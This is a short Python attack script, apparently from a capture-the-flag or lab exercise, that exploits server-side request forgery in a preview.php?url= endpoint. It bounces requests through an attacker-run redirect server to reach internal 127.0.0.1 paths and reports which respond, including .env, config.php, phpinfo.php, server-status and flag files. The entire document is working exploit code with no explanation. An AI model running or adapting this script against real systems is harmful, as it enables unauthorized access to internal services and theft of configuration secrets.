import requests, urllib.parse

attacker = 'http://192.168.223.117:8000'
base = 'http://10.82.159.192/preview.php?url='

# Paths to try via 127.0.0.1 (different from cvssm1 vhost)
targets = [
    'http://127.0.0.1/',
    'http://127.0.0.1/index.php',
    'http://127.0.0.1/admin',
    'http://127.0.0.1/admin/',
    'http://127.0.0.1/admin/index.php',
    'http://127.0.0.1/login',
    'http://127.0.0.1/login.php',
    'http://127.0.0.1/flag',
    'http://127.0.0.1/flag.txt',
    'http://127.0.0.1/.env',
    'http://127.0.0.1/secret',
    'http://127.0.0.1/server-status',
    'http://127.0.0.1/config.php',
    'http://127.0.0.1/phpinfo.php',
]

print('Testing open-redirect bypass...\n')
for target in targets:
    redirect_url = f'{attacker}/redirect?to={urllib.parse.quote(target, safe="")}'
    r = requests.get(base + urllib.parse.quote(redirect_url, safe=''), timeout=8)
    body = r.text.strip()
    is404 = '<title>404' in body or '<h1>Not Found' in body
    blocked = 'blocked' in body.lower()
    if blocked:
        print(f'[BLOCKED] {target}')
    elif is404:
        print(f'[404]     {target}')
    elif not body:
        print(f'[EMPTY]   {target}  (redirect not followed?)')
    else:
        print(f'[HIT]     {target}  ({len(body)}b)')
        print(f'          {body[:200]}')
        print()
